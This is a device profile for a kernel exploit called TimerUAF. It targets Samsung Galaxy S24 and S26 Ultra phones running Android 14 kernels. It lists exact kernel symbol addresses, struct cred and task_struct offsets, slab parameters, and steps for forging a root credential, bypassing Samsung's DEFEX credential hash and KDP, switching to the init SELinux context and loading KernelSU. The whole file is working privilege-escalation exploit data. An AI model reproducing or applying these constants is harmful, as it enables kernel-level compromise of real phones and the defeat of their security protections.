# TimerUAF kernel profile: Samsung Galaxy S24 (SM-S921N) / S26 Ultra (SM-S948U)
#
# This is the Samsung-specific mode.  It keeps the same timer-UAF trigger as
# the generic profiles but adds the vendor endgame:
#
#   - Samsung DEFEX creds_fast_hash bypass (defex_creds_hash below)
#   - worker moves to u:r:init:s0 and bind-mounts the bundled diabl0w/KernelSU
#     ksud over /system/bin/logcat so KDP does not SIGKILL a direct exec
#   - ksud late-load is pinned to the diabl0w/KernelSU manager package
#     (me.weishu.kernelsu, versionName samsung-v*), no manager discovery
#   - SELinux is left to ksud's own restore (no userspace re-enforce)
#
# Constants ported from SamTimer (jonrazta89/SamTimer), which derived them
# from the SM-S948U vmlinux.elf .symtab/.BTF/disassembly.  The release is a
# prefix because Samsung firmware appends its own build suffix.
#
# Keep this directory out of the generic scan: UserService only looks here
# when Samsung mode is enabled, and the binary refuses --samsung unless the
# profile sets samsung_mode = 1.
release_prefix = "6.1.162-android14-11"
schema_version = 1
ksu_kmi = "android14-6.1"

# Samsung endgame switches.
samsung_mode = 1
# Pinned to the diabl0w/KernelSU Samsung build.  It uses the upstream
# KernelSU package name; the manager must report versionName samsung-v*
# (the app checks this) and the bundled ksud is from the same release.
samsung_package = "me.weishu.kernelsu"
# creds_fast_hash (8-byte pointer array indexed by pid).  Clearing the
# child's bucket entry makes task_defex_check_creds() see stored uid 0,
# which matches the forged cred.
defex_creds_hash = 0xffffffc00a66e9f8

# 4K-page variant (the Samsung 6.1 kernels targeted here use 4K pages).
page_size = 4096
page_shift = 12
slab_order = 1
slab_size = 8192
linear_min = 0xffffff0000000000
linear_max = 0xffffffc000000000

# 5.15/6.1 free order-1 slab pages through the PCP lists.
pcp_free = 1
alloc_req_off = 0x10

# do_timer_create -> kmem_cache_alloc(posix_timers_cache) call site.
timer_site = 0xffffffc008194fe0
timer_alloc = 0x108
timer_node_off = 0x78

# cred_jar: sizeof(struct cred)=0xb0, HWCACHE_ALIGN bytes_alloc=0xc0.
cred_req = 0xb0
cred_alloc = 0xc0
cred_size = 0xb0
cred_uid_off = 0x4
cred_euid_off = 0x14
cred_cap_off = 0x28
cred_cap_count = 5
cred_security_off = 0x78
cred_user_off = 0x80
cred_userns_off = 0x88
cred_ucounts_off = 0x90
cred_group_off = 0x98
fake_cred_off = 0x18

# Link-time symbols (kallsyms).
selinux_state = 0xffffffc00a5ea4a8
panic_on_warn = 0xffffffc00a2eac00

# task_struct / cred layout (BTF).
task_cred_off = 0x838
copy_process_low21 = 0xacb7c
task_alloc_bytes = 0x12c0

# Capability and fake-cred refcounted sub-objects.
fullcap = 0x1ffffffffff
root_user = 0xffffffc00a310a00
init_user_ns = 0xffffffc00a310770
init_ucounts = 0xffffffc00a3121d8
init_groups = 0xffffffc00a311d20

# task_security_struct: SELinux is the only cred-blob LSM here.
selinux_blob_off = 0x0
selinux_sid_kernel = 1
